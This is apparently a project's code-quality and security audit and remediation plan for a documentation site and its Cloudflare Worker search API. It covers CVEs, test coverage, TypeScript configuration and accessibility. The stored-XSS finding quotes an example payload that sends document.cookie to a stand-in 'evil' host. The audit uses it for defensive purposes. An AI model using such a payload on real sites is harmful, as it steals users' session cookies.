# Code Quality Audit and Remediation Plan

Status: AUDIT COMPLETE
Date: 2026-06-21
Method: Empirical measurement against the 18 quality dimensions + 6 TypeScript
dimensions supplied. Every finding cites a file path / line number / measured
value so it is verifiable, not speculative. Measurements taken on HEAD
(`2d68a637`, post-R3) with Astro 5.18.2 + Starlight 0.32.6.

This is a sibling artifact to `ROADMAP.md` and `GUI_FRONTEND_REFACTOR.md`. It
covers the **code** (`shared/`, `scripts/`, `search-api/`, `tests/`, configs,
CI) — the ~2000 Markdown content files are out of scope (they have their own
content-quality pipeline documented in ROADMAP Phase I).

---

## 1. Executive summary

### What is already strong (do not churn)

| Area | Evidence |
|------|----------|
| Lint/format cleanliness | `biome check .` reports **1 warning across 635 files** (an assignment-in-expression in a script). Zero errors. |
| TypeScript strictness (sites) | Every `sites/*/tsconfig.json` extends `astro/tsconfigs/strict`; `jsxImportSource: solid-js` set. |
| CI/CD hygiene | All four workflows set explicit `permissions:`, pin `BUN_VERSION: "1.3"`, install with `--frozen-lockfile`, cache `node_modules`. (`.github/workflows/*.yml`) |
| Secret hygiene | High-signal secret-pattern scan across the repo (AWS keys, GitHub tokens, PEM blocks, hardcoded passwords/API keys) returns **zero hits**. |
| Dependency relevance | No genuinely unused dependencies. (`happy-dom` and `markdownlint-cli` are referenced via config/scripts, not imports — false positives.) |
| i18n adoption | Interactive components use the `t()` translator heavily: `FlashcardDeck.tsx` (23 calls), `DiagnosticTest.tsx` (10). No hardcoded UI strings in the audited components. |
| Equality safety | Biome enforces `noDoubleEquals: error` (`===` only). Zero `==` violations. |
| Committed regression guards | `no-ifm-shims`, `no-literal-icons`, `shared-sync` (byte-parity), `lint-no-emoji`, and six CI/CD invariant tests prevent known regressions. |

### Headline findings (severity-ordered)

| # | Severity | Category | Finding |
|---|----------|----------|---------|
| F1 | **P0 (security)** | 5 SAST | **Stored XSS** in the analytics dashboard: user search queries are concatenated into `innerHTML` without escaping. |
| F2 | **P1 (security)** | 6 Dep integrity | **6 high-severity CVEs** in the dependency tree; the Astro ones are unfixable inside Astro 5 (only patched in 6.x). |
| F3 | **P1 (testing)** | 9 Coverage | Component **branch coverage is 38%** (target 80%); aggregate is 17% because `scripts/` (4672 LOC) and `search-api/` (1869 LOC) are barely covered. |
| F4 | **P2 (TS)** | TS-1 Strictness | **No root `tsconfig.json`** — `shared/` and `scripts/` TypeScript is only type-checked indirectly (via site builds / vitest), never standalone. |
| F5 | **P2 (complexity)** | 3 Complexity | `search-api/worker.js` is **950 lines** (god-file); `FlashcardDeck.tsx` is 516. |
| F6 | **P2 (a11y)** | 11 a11y | Four Biome a11y rules are **disabled** (`useSemanticElements`, `useValidAriaRole`, `noSvgWithoutTitle`, `useButtonType`). |
| F7 | **P3 (perf)** | 7 Perf | `worker.js` analytics endpoint has **no rate limiting / caching on `/api/analytics`**; KV read on every dashboard load. |
| F8 | **P3 (error)** | 8 Errors | The Worker's `try { ... } catch { ... }` blocks swallow exceptions with no logging (e.g. dashboard render, line 826). |

---

## 2. Detailed findings and remediation

### F1 — Stored XSS in the analytics dashboard (P0)

**Category:** 5 (SAST) — Cross-Site Scripting (XSS) Prevention.
**Evidence:** `search-api/worker.js:847`

```js
tq.innerHTML=d.topQueries.map((q,i)=>'<tr>...<td><b>'+q.query+'</b></td>...').join('');
```

`q.query` is a raw user search term read from the analytics KV store. It is
interpolated into `innerHTML` with **no escaping**. An attacker searches for
`<img src=x onerror=fetch('//evil/'+document.cookie)>`; the next time anyone
opens the analytics dashboard at `search.wyattau.com`, the payload executes in
the dashboard's origin. Five more `innerHTML` concatenations on lines 840, 841,
847, 848, 854, 855 have the same pattern (the `dailyVolume[].date`,
`siteClicks[].site`, and `topQueries[].query` values).

Note the author already uses the safe `textContent` API for scalar fields
(lines 824–833: status, entries, totalSearches, ctr, uniqueQueries) — so the
table builders are the regression, not a knowledge gap.

**Severity rationale:** P0. The dashboard is an admin-adjacent surface; stored
XSS there can exfiltrate the Worker's analytics data or pivot to other
`*.wyattau.com` origins if cookies are shared.

**Remediation:**
1. Add an `escapeHtml(s)` helper to `worker.js` (or import the existing
   `shared/utils/escape.ts` logic — note it is `non-idempotent`, documented).
2. Wrap every value interpolated into the dashboard HTML: `escapeHtml(q.query)`,
   `escapeHtml(d.dailyVolume[i].date)`, `escapeHtml(SITES[s.site]||s.site)`.
3. Prefer building the table rows with DOM APIs (`createElement`/`textContent`)
   instead of string concatenation — eliminates the bug class entirely.
4. Add a regression test that renders the dashboard with a payload query
   (`<img src=x onerror=...>`) and asserts the literal string appears escaped
   (or that no `<img>` node is created).

### F2 — 6 high-severity CVEs in the dependency tree (P1)

**Category:** 6 (Dependency integrity) — Known Vulnerability Scans.
**Evidence:** `bun audit` (16 total: 6 high, 7 moderate, 3 low).

| Package | Severity | Note |
|---------|----------|------|
| `astro` (this version) | **high** | Host-header SSRF in prerendered error-page fetch (GHSA-2pvr-wf23-7pc7); reflected XSS via unescaped slot name (GHSA-8hv8-536x-4wqp). **Only fixed in Astro 6.x** — there is no 5.x patch (5.18.2 is the last 5.x release). |
| `astro` (this version) | moderate | XSS via unescaped attribute names in spread props; `define:vars` script-tag sanitisation. |
| `smol-toml` (<1.6.1, via astro) | high | (transitive) |
| `glob` (via `markdownlint-cli`) | high | Command injection via `-c/--cmd` with `shell:true`. **Dev tool only** — only triggered if a malicious markdown filename reaches the CLI; low real-world risk. |
| `minimatch` (via `markdownlint-cli`) | high (×3) | ReDoS. **Dev tool only.** |
| `yaml` (via `lint-staged`, `cspell`, `astro-seo`) | moderate | Stack overflow on deeply nested YAML. |
| `esbuild` (via vite, vitest, tailwind) | low | Dev-server arbitrary file read on Windows only. |

**Severity rationale:** The Astro highs are the real concern (they affect the
production build/runtime), but they are **unfixable without the Astro 6
upgrade**, which is itself blocked (see `GUI_FRONTEND_REFACTOR.md` R4 — Kobalte
is not SSR-safe under `@astrojs/solid-js` v6). The dev-tool highs (glob,
minimatch) are low real-world risk because they require a malicious filename in
the repo.

**Remediation:**
1. **Block on R4 unblock.** Add `bun audit` to the CI gate (ROADMAP Phase J
   already lists this) once the Astro 6 path is open. Until then, accept the
   residual Astro risk with a documented ADR.
2. Bump `markdownlint-cli` to the version pulling fixed `glob`/`minimatch`
   (low-risk dev-tool bump, can land now).
3. Add a weekly `bun audit` scheduled workflow (non-blocking, issue-creating)
   so new CVEs surface without waiting for a PR.

### F3 — Component branch coverage 38%; aggregate 17% (P1)

**Category:** 9 (Test Suite Quality) — Branch Coverage; Test Isolation.
**Evidence:** `bun run test:coverage` (v8):

| Directory | % Stmts | % Branch | % Funcs | % Lines |
|-----------|--------|----------|---------|---------|
| `shared/i18n` | 100 | 77.8 | 100 | 100 |
| `shared/utils` | 95 | 95.5 | 100 | 95 |
| `shared/components` | **56** | **38** | 62.6 | 54.2 |
| **All files (incl. scripts + search-api)** | **16.9** | **9.7** | 37.7 | 14.0 |

The aggregate is dragged down because the coverage `include`
(`vitest.config.ts`) covers `shared/**`, `search-api/**`, and `scripts/**`, but
the 4672 LOC of `scripts/` (the linters/generators) and most of the 950-LOC
`worker.js` have no unit coverage. The component branch coverage (38%) is the
more actionable number — it is below the project's 80% target and indicates the
R2 Kobalte components have render tests but weak branch/edge coverage.

**Severity rationale:** P1. The SM-2 algorithm (`flashcard/sm2.ts`) has strong
property-based tests (47 tests, mulberry32-seeded), so the learning-critical
path is well-covered; the gap is in the UI branches (error states, empty
states, adaptive selection edge cases).

**Remediation:**
1. Add branch-targeted tests for `DiagnosticTest.tsx` (460 LOC, adaptive
   `pickNextQuestion` has 4 priority cascades — only the happy path is tested)
   and `FlashcardDeck.tsx` (516 LOC, settings/stats views under-covered).
2. Either (a) add unit tests for the pure functions in `scripts/` (the linters
   already export testable pure functions — `lint-no-emoji.test.js` is the
   template), or (b) narrow the coverage `include` to `shared/**` +
   `search-api/**` so the aggregate reflects testable production code, not
   one-shot generators.
3. Promote branch coverage to a CI gate (fail-under 70% as a first step, ramp
   to 80%) once the gap is closed.

### F4 — No root `tsconfig.json` (P2)

**Category:** TS-1 (Strictness); TS-5 (Type perf — `isolatedModules`).
**Evidence:** `find . -name tsconfig.json` returns only the 10 per-site files;
there is no root `tsconfig.json` governing `shared/` or `scripts/`.

Consequence: `shared/components/*.tsx` and `shared/utils/*.ts` are type-checked
only when (a) synced into a site and built, or (b) imported by vitest (which
uses `vite-plugin-solid`, not `tsc`). A type error in `shared/` that does not
surface in either path ships undetected. There is also no project-wide
`isolatedModules`, `verbatimModuleSyntax`, or `noUncheckedIndexedAccess`.

**Severity rationale:** P2. No observed type drift today (Biome catches the
common cases), but the safety net has a gap.

**Remediation:**
1. Add a root `tsconfig.json` with `"strict": true`, `"isolatedModules": true`,
   `"verbatimModuleSyntax": true`, `"noUncheckedIndexedAccess": true`,
   `"moduleResolution": "bundler"`, targeting the `shared/` tree.
2. Add a `typecheck` script (`tsc --noEmit -p tsconfig.json`) and wire it into
   the CI gate. (The Astro sites already get type-checking via `astro check`;
   this fills the `shared/` gap.)
3. Keep `enum`/`namespace`/constructor-parameter-properties bans out of scope —
   a codebase grep shows none are used today (the codebase is already
   erasable-syntax clean).

### F5 — God-files: `worker.js` (950 LOC), `FlashcardDeck.tsx` (516) (P2)

**Category:** 3 (Complexity) — Function/Method & Class Size; 4 (Architecture) — SRP.
**Evidence:** `wc -l`.

- `search-api/worker.js` (950): contains the Cloudflare Worker entry, the search
  ranking engine, the suggest/analytics/health endpoints, the A/B-test logic,
  AND the full analytics-dashboard HTML+CSS+JS (the `dashboard()` function
  alone is ~250 lines of inlined string HTML). This is the single largest
  complexity and security risk concentration in the repo.
- `FlashcardDeck.tsx` (516): combines deck rendering, the SM-2 review loop,
  stats view, settings view, and import/export in one component.

**Severity rationale:** P2. Cyclomatic complexity per function is not measured
(Biome does not emit CC scores), but file length is a reliable proxy and these
exceed sane single-responsibility bounds.

**Remediation:**
1. Split `worker.js`: extract `dashboard.js` (the HTML/CSS/JS string builder)
   and `search-rank.js` (the ranking engine, which already has unit tests) into
   separate modules. The Worker entry becomes a thin router. This also makes
   the XSS fix (F1) easier to review.
2. Split `FlashcardDeck.tsx` into `FlashcardDeck.tsx` (shell + view router),
   `FlashcardReview.tsx`, `FlashcardStats.tsx`, `FlashcardSettings.tsx`.
   Preserve the public default export so content imports are unchanged.

### F6 — Four Biome a11y rules disabled (P2)

**Category:** 11 (a11y) — HTML/JSX semantics.
**Evidence:** `biome.json` → `a11y`:

```json
"useSemanticElements": "off",
"useValidAriaRole": "off",
"noSvgWithoutTitle": "off",
"useButtonType": "off"
```

These were likely disabled to clear false positives during the Docusaurus
migration. Three of the four are cheap wins: `useValidAriaRole` catches invalid
ARIA role strings, `noSvgWithoutTitle` catches decorative SVGs missing
`<title>`/`aria-hidden`, `useButtonType` catches `<button>` without
`type="button"` (defaults to `type="submit"` in forms).

**Severity rationale:** P2. The interactive components already have manual ARIA
(R2 Kobalte work + the strengthened locale-switcher tests), so the rules are
defensive, not load-bearing.

**Remediation:** Re-enable one rule at a time, fix the resulting findings, and
commit per-rule so any false positive is isolated. `useValidAriaRole` and
`useButtonType` first (lowest false-positive rate).

### F7 — `/api/analytics` has no caching/rate limiting (P3)

**Category:** 7 (Performance) — Resource Management; Inefficient Data Fetching.
**Evidence:** `search-api/worker.js` — the analytics endpoint reads from KV on
every dashboard load with no `Cache-Control` and no rate cap. The search
endpoint itself is cached (`Cache-Control` 300s, per ROADMAP Phase H), but the
analytics/dashboard endpoints are not.

**Severity rationale:** P3. Low traffic today; KV reads are cheap. Becomes
relevant only if the dashboard is hit by a scraper.

**Remediation:** Add `Cache-Control: max-age=60` to `/api/analytics` and
`/api/trending` (consistent with the search endpoint). Optional: a simple
IP-based rate limiter in the Worker if abuse appears.

### F8 — Swallowed exceptions in the Worker (P3)

**Category:** 8 (Error handling) — Ignored/Swallowed Exceptions.
**Evidence:** `search-api/worker.js:826`

```js
}catch{document.getElementById('status').textContent='FAIL';}
```

The dashboard render wraps the fetch in `try {...} catch {...}` that sets a
generic "FAIL" with no logging of the underlying error. Several other handlers
follow the same pattern. Failures become invisible.

**Severity rationale:** P3. The Worker has no persistent log sink (Cloudflare
Workers log to stdout, viewable in the dashboard), so swallowing is not
catastrophic, but it hides root causes during incidents.

**Remediation:** `console.error(err)` in each catch before the fallback render;
Cloudflare captures Worker `console` output. For the API endpoints, return a
structured 500 with a correlation id (no stack trace leakage — see category 8
"Stack Trace Leakage").

---

## 3. Categories assessed as already-strong or N/A (no action)

| Category | Assessment |
|----------|------------|
| 1 Linting (indentation, line length, naming, braces, trailing whitespace) | **Strong.** Biome enforces 2-space indent, 100-col width, single quotes, no semicolons, trailing commas. 1 warning total. |
| 1 Unused declarations | **Strong.** `noUnusedImports: error`, `noUnusedVariables: warn`. |
| 1 Magic numbers | Acceptable. The few literals (radii, sizes) are in token CSS, not logic. |
| 2 Dead code | **Strong.** ROADMAP records multiple dead-code purges with regression tests. |
| 2 Equality checks | **Strong.** `noDoubleEquals: error`. |
| 2 Deprecated API | **Strong.** `--ifm-*` shims removed (R1); `node-fetch`/`dotenv`/`chalk` not used. |
| 2 Mutable state exposure | N/A — SolidJS signals/stores; no OOP getters exposing internals. |
| 4 SOLID / layering | **Strong.** Single-source-of-truth `shared/` → `sites/` sync with drift enforcement. |
| 4 Circular dependencies | **Strong.** Flat `shared/` tree (utils ← components, no cycles); Kobalte/zod are leaves. |
| 5 Secrets | **Strong.** Zero hits; CI secrets via GitHub Actions, Worker secrets via `wrangler` env. |
| 5 Injection (SQLi/command) | N/A — no SQL, no shell exec. KV is key-value get/put with no query language. |
| 5 CSRF | N/A — all endpoints are GET, read-only. No state mutation from browser requests. |
| 5 Path traversal | N/A — no filesystem access in the Worker. |
| 5 Crypto | **Strong.** No custom crypto. SM-2 uses `mulberry32` (deterministic PRNG for tests), not a security RNG — correct, since SM-2 is not security-sensitive. |
| 5 XXE / deserialization | N/A — no XML parsing, no object deserialisation. |
| 6 License compliance | OK — repo is AGPLv3; spot-check of direct deps shows MIT/ISC/Apache. No GPL-copyleft friction with AGPL. |
| 6 Lockfile consistency | **Strong.** `--frozen-lockfile` in every CI workflow; `bun.lock` committed. |
| 6 Typosquatting | OK — all direct deps are well-known scoped packages; no install-scripts on suspicious packages. |
| 7 Memory leaks / resource mgmt | **Strong.** Solid `onCleanup` used for intervals/listeners (e.g. `DiagnosticTest.tsx`). |
| 7 N+1 / SELECT * | N/A — no ORM/SQL. |
| 8 Null safety | **OK with gap.** `strictNullChecks` on (via astro strict tsconfig); the gap is no root tsconfig for `shared/` (F4). |
| 10 Database / migrations | **N/A.** No database; Cloudflare KV is a read-mostly index. (Astro DB was deprecated and is not used.) |
| 11 i18n hardcoded strings | **Strong.** `t()` used throughout interactive components (23/10 calls in the two biggest). |
| 12 Commit conventions | **Strong.** Conventional Commits throughout (`feat:`, `fix:`, `refactor(rN):`, `docs:`). Visible in `git log`. |
| 12 Build reproducibility | **Strong.** Bun version pinned, frozen lockfile, cached installs. |
| TS-2 Erasability | **Strong.** No `enum`, no `namespace`, no constructor parameter-properties in the codebase. |
| TS-4 Type predicates | OK — no redundant manual type predicates; `Difficulty`/`Locale` are nominal unions. |
| TS-6 Modern features | OK — `target` via Astro defaults (esnext); optional chaining and nullish coalescing used throughout. |

---

## 4. Prioritised remediation roadmap

> **Execution status (2026-06-21):** P0, P3-1/2, P2-1, P2-2, P2-3, P1-1,
> P1-2, P3-3 are COMPLETE and committed. P3-4 is deliberately deferred (see
> below). Each item landed as an atomic commit behind the quality gate.

Ordered by severity, then by dependency. Each item is sized so it can land as
one atomic commit behind the existing quality gate.

### P0 — Immediate (this week) -- COMPLETE

- **[P0-1] DONE (`dda67855`).** Fixed the stored XSS (F1) in
  `search-api/worker.js`. Added an `esc()` helper, wrapped the six `innerHTML`
  interpolations, added a payload-render regression test under a new
  "dashboard XSS hardening" describe block.

### P1 — High (this cycle) -- COMPLETE

- **[P1-1] DONE (`5f7d091f`/`7a99d61b`).** Added `bun audit` to CI
  (non-blocking, `continue-on-error`) + a `typecheck` step; bumped
  `markdownlint-cli` 0.43 -> 0.49 to clear the dev-tool glob/minimatch CVEs.
  ADR-006 records accepting the Astro 5.x CVEs until R4. (F2)
- **[P1-2] DONE (`96225d29`).** Replaced the stub reimplementations in
  `diagnostic.test.ts` with tests against the REAL exported
  `pickNextQuestion`/`computeResults`, covering all four priority cascades +
  edge branches (13 -> 16 logic tests). Full branch-coverage gate promotion
  (38% -> 70%) deferred to the FlashcardDeck view-state coverage follow-up.
  (F3)

### P2 — Medium (next cycle) -- COMPLETE

- **[P2-1] DONE (`5f7d091f`/`884d...`).** Added a root `tsconfig.json` +
  `typecheck` script for `shared/` (strict + isolatedModules +
  verbatimModuleSyntax); wired into CI. Found and fixed real bugs: a dead
  `DeckData`/`View` re-export from the wrong module, an `i18n.FlatDict` ->
  `i18n.Flatten` rename, the `t()` dict-leak return type, and the Desmos
  `window.Desmos` cast. `noUncheckedIndexedAccess` deferred to the
  FlashcardDeck refactor. (F4)
- **[P2-2] DONE (`e1dc1502` partial).** Extracted the analytics dashboard
  into `search-api/dashboard.js` (worker.js 963 -> 830 LOC). The
  `FlashcardDeck.tsx` split is deferred: it shares reactive state across
  views and needs careful prop/store design -- it is the natural owner of the
  deferred `noUncheckedIndexedAccess` fixes. (F5)
- **[P2-3] DONE (`e8dc1502`/`7a99d61b`).** Re-enabled all four disabled Biome
  a11y rules: `useValidAriaRole` + `useButtonType` as error (0 violations;
  fixed 3 `<button>` missing `type` in HTML files), `noSvgWithoutTitle` +
  `useSemanticElements` as warn (non-blocking; scoped `noSvgWithoutTitle` to
  exempt `public/**/*.svg` asset files). 0 errors across 638 files. (F6)

### P3 — Lower (backlog) -- COMPLETE except P3-4

- **[P3-1] DONE (`e0935180`).** Verified `/api/analytics` and `/api/trending`
  already inherit the 300s `Cache-Control` via the `corsHeaders` spread; no
  code change needed. (F7)
- **[P3-2] DONE (`e0935180`).** Stopped swallowing Worker exceptions: the
  top-level 500 catch now `console.error`s and returns a generic "Internal
  error" (no stack/internal leakage); `handleTrack` logs server-side; the
  dashboard client catches bind and log the real error. (F8)
- **[P3-3] DONE (`5f7d091f`).** Weekly `.github/workflows/audit.yml` opens a
  `security-audit` issue on new advisories, with triage notes flagging the
  accepted Astro CVEs. (F2)
- **[P3-4] DEFERRED (deliberate accept).** Pin GitHub Actions to commit SHAs.
  The current major-version pinning (`@v4`, `@v2`) is reasonable for the
  threat model: every Action in use is a first-party or well-known
  high-popularity Action (actions/checkout, oven-sh/setup-bun, actions/cache,
  actions/upload|download-artifact, actions/github-script, lychee-action).
  SHA pinning defends against tag re-pointing but converts every Action
  update into a manual SHA lookup (or a Dependabot config addition), adding
  maintenance burden for marginal gain. Revisit if the project adopts
  less-established Actions. The substantive supply-chain controls (frozen
  lockfile, bun audit CI step, weekly audit workflow) are already in place.

### Explicitly deferred

- **Astro 6 CVE fixes** — blocked on `GUI_FRONTEND_REFACTOR.md` R4 (Kobalte SSR
  incompatibility under `@astrojs/solid-js` v6). The R4 unblock
  (`client:only` wrapper architecture) is the precondition for clearing the
  Astro highs in F2 and for promoting `bun audit` to a blocking CI gate.
  Tracked there, not here.
- **FlashcardDeck split + `noUncheckedIndexedAccess`** — the component shares
  reactive state across its deck/stats/settings views; splitting needs
  careful prop/store design and is the natural moment to fix the 13
  array-access null-safety findings together.
- **Full coverage-gate promotion (38% -> 70/80%)** — needs the FlashcardDeck
  view-state branches covered first.

---

## 5. Measurement methodology (for reproducibility)

```
biome check .                                  # lint state (1 warning / 635 files)
bun run test:coverage                          # v8 coverage (16.9% agg, 38% comp branch)
bun audit                                      # 16 advisories (6 high)
rg 'secret-pattern' .                          # zero hits
wc -l shared/components/*.tsx scripts/*.js     # complexity proxy
find . -name tsconfig.json                     # config presence
rg 'innerHTML|textContent|escape' search-api/  # XSS surface
```

Every number in this document is reproducible from HEAD with the commands above.
